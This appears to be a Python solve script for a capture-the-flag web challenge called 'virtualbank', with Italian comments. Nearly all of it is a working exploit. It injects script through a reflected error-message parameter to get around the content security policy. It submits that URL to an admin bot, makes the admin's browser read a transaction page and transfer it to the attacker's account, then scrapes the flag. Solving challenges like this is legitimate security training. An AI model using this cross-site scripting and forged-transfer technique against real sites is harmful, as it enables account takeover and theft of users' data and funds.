import random, re, string, requests
from hashlib import sha256
from bs4 import BeautifulSoup

s = requests.Session()
username, password = "tempName","tempPassword" # TODO change this names
site = "http://virtualbank.challs.olicyber.it/"
sitePayload = f"""http://virtualbank.challs.olicyber.it/error/?msg=<body><script src='/error/?msg=
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "/history/1", false );
xmlHttp.send( null );
console.log(xmlHttp.responseText);
var xmlHttp2 = new XMLHttpRequest();
xmlHttp2.open("POST", "/sendmoney", false );
var data = new URLSearchParams();
data.append("to", "{username}");
data.append("amount", "2");
data.append("description", xmlHttp.responseText);
xmlHttp2.send(data);
'></script>"""

# questo payload va eseguito nel form dell'admin
# facendo un ?msg=payload riusciamo ad avere il payload sul sito della banca
# mettendo il risultato con <script src="/error..." riusciamo ad eseguirlo
# facendo così exploitiamo le content security policy del sito
# nel payload ricavo solo l'html di /history/1 e me lo mando con un pagamento dall'admin

def calculate(pow):
    while True:
        x = ''.join(random.choices(string.ascii_letters, k=25))
        if(sha256(x.encode()).hexdigest().endswith(pow)):
            return x
s.post(site + "signup", data={"username":f"{username}", "password":f"{password}"}) 
s.post(site + "login", data={"username":f"{username}", "password":f"{password}"}) 
txt = s.get(site + "jobs").text.encode('cp850','replace').decode('cp850') # il simbolo dei bitcoin fa crashare tutto
b = BeautifulSoup(txt, 'html.parser')
for i in b.findAll("h6"):
    pow = str(re.findall("pow: [0-9a-z]{5}", str(i))[0]).replace("pow: ", "")
    solve = calculate(pow)
r = s.post(site + "jobs", data={"pow":f"{solve}","url":sitePayload})
txt = s.get(site + "history").text.encode('cp850','replace').decode('cp850') # il simbolo dei bitcoin fa crashare tutto
b = BeautifulSoup(txt, "html.parser")
for i in b.findAll("a"):
    f = re.findall("[\/]history[\/][0-9]*", str(i))
    if len(f) > 0:
        link = str(f[len(f)-1])[1:] # prendo l'ultima transazione senza contare il primo '/' es /history/42 -> history/42
r = s.get(site + link).text.encode('cp850','replace').decode('cp850')
flag = re.findall("flag{.*}", r)
print(flag[0], end="")